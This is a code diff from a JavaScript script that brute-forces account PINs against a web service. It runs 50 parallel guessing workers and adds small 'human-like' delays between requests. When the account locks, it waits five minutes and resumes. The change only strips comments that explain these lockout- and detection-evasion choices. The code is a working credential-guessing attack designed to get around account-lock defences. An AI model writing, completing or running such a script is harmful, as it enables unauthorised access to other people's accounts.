@@ -41,7 +41,8 @@
             } else if (res.status === 403 && json.errorCode === "ERRORCODE20") {
                 console.log(`\n⚠️ Account locked at ${pin} — pausing 5 mins...`);
                 await new Promise(r => setTimeout(r, 300000));
-                return tryPin(num); // retry same PIN
+                return tryPin(num); 
+
             }
         } catch(e) {}
 
@@ -51,14 +52,16 @@
         }
     };
 
-    const workers = 50; // low enough to avoid lock
+    const workers = 50; 
+
     let i = 0;
     const run = async () => {
         while (i < TOTAL && !found) {
             const promises = [];
             for (let j = 0; j < workers && i < TOTAL; j++) {
                 promises.push(tryPin(i++));
-                await new Promise(r => setTimeout(r, 10)); // tiny human-like delay
+                await new Promise(r => setTimeout(r, 10)); 
+
             }
             await Promise.allSettled(promises);
         }
